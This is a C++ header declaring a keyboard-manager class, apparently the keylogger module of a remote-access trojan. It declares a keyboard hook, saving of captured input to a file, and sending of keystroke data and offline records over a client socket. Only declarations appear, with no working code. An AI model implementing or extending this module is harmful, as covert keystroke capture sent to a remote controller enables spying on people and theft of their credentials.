// KeyboardManager.h: interface for the CKeyboardManager class.
//
//////////////////////////////////////////////////////////////////////

#if !defined(AFX_KEYBOARDMANAGER_H__F0442063_CAAE_4BA1_B6CA_1FCB39A996AC__INCLUDED_)
#define AFX_KEYBOARDMANAGER_H__F0442063_CAAE_4BA1_B6CA_1FCB39A996AC__INCLUDED_

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000

#include "Manager.h"

class CKeyboardManager : public CManager  
{
public:
	CKeyboardManager(CClientSocket *pClient);
	virtual ~CKeyboardManager();
	virtual void OnReceive(LPBYTE lpBuffer, UINT nSize);
	static HINSTANCE	g_hInstance;
	static DWORD m_dwLastInput;
	static bool StartHook();
	static void StopHook();

private:
	static LRESULT CALLBACK GetMsgProc(int nCode, WPARAM wParam, LPARAM lParam);
	static void SaveInfo(char *lpBuffer);
	static void SaveToFile(char *lpBuffer);
	int sendOfflineRecord();
	int sendStartKeyBoard();
	int sendKeyBoardData(LPBYTE lpData, UINT nSize);
};

#endif // !defined(AFX_KEYBOARDMANAGER_H__F0442063_CAAE_4BA1_B6CA_1FCB39A996AC__INCLUDED_)
